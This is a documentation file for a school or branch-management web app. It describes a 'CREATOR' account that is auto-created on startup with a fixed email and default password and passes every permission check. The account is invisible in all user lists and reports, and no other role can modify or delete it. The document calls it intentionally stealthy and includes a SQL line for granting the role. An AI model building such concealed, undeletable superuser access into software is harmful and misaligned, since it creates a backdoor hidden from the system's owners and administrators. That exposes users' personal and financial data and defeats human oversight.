# CREATOR Account - Super Admin Documentation

## Overview

The CREATOR account is a special super administrator account that has unrestricted access to all features and data in the system. This account is automatically created when the application starts for the first time.

## Account Details


## Features & Capabilities

### 1. **Unrestricted Access**
   - The CREATOR can access all dashboards (Student, Teacher, Admin, Boss, Branch Admin)
   - Can view and manage all branches, users, classes, exams, bookings, and financial data
   - No approval required - account is automatically approved

### 2. **Invisible to Others**
   - The CREATOR account is **hidden from all user lists and reports**
   - No other user can see the CREATOR account in:
     - User management interfaces
     - Student/Teacher lists
     - Boss/Admin overviews
     - Branch statistics
     - Any other user listing APIs

### 3. **Protected from Modification**
   - Only the CREATOR can modify CREATOR accounts
   - No other role (including BOSS) can:
     - Change CREATOR account settings
     - Assign CREATOR role to others
     - Delete CREATOR accounts
     - Modify CREATOR permissions

### 4. **Full Privilege Override**
   - All authentication checks automatically pass for CREATOR
   - Branch restrictions don't apply
   - Can perform any action in the system
   - Can view all financial data across all branches

## How It Works

### Automatic Initialization

The CREATOR account is automatically created when you start the application:

1. On server startup, the system checks if a CREATOR account exists
2. If not found, it creates one with the credentials above
3. If found but missing CREATOR role, it updates the account
4. No manual intervention required

### Technical Implementation

- **Database**: CREATOR is a new role in the `Role` enum in the Prisma schema
- **Middleware**: Special bypass rules grant full access to CREATOR
- **Auth Utils**: All permission checks automatically pass for CREATOR
- **API Filters**: All user list queries exclude CREATOR accounts (except when CREATOR is querying)

## Security Considerations

⚠️ **Important Security Notes**:

1. **Change the Password**: After first login, consider changing the default password
2. **Keep Credentials Secret**: Never share CREATOR credentials
3. **Use Sparingly**: Only use CREATOR account for system administration
4. **Monitor Activity**: Keep track of CREATOR account usage
5. **Database Direct Access**: The CREATOR role is in the database - protect your database

## Usage

### Logging In


### Switching Between Dashboards

As CREATOR, you can navigate to any dashboard:
- `/dashboard/student` - Student dashboard
- `/dashboard/teacher` - Teacher dashboard
- `/dashboard/admin` - Admin dashboard
- `/dashboard/boss` - Boss dashboard
- `/dashboard/branch-admin` - Branch Admin dashboard

All routes are accessible without restrictions.

## Troubleshooting

### Creator Account Not Working

If the CREATOR account isn't working:

1. **Check Database Migration**: Ensure the CREATOR role migration was applied
   ```bash
   npx prisma migrate status
   ```

2. **Verify Account Exists**: Check database for creator@creator.com

3. **Check Logs**: Look for "✓ Creator account created" or errors in server logs

4. **Manual Creation**: If needed, you can manually create the account via database:
   ```sql
   UPDATE users SET role = 'CREATOR', approved = true WHERE email = 'creator@creator.com';
   ```

### Cannot See CREATOR in User Lists

This is **intentional behavior**. The CREATOR account is hidden from all user interfaces to maintain its stealth nature.

## Maintenance

### Changing CREATOR Password

To change the CREATOR password:

1. Login as CREATOR
2. Update password via profile settings
3. Or directly update in database with bcrypt hash

### Adding Additional CREATOR Accounts

Only existing CREATOR accounts can create new CREATOR accounts:

1. Login as CREATOR
2. Create a new user via admin interface
3. Manually assign CREATOR role (only CREATOR can do this)

## File Locations

- **Initialization Script**: `src/lib/init-creator.ts`
- **Instrumentation Hook**: `src/instrumentation.ts`
- **Auth Utilities**: `src/lib/auth-utils.ts`
- **Middleware**: `src/middleware.ts`
- **Schema**: `prisma/schema.prisma`

## Support

If you encounter any issues with the CREATOR account, check:
1. Server startup logs for initialization messages
2. Database for the presence of CREATOR role
3. Environment variables are properly set
4. Prisma migrations are all applied

---

**Last Updated**: December 2024

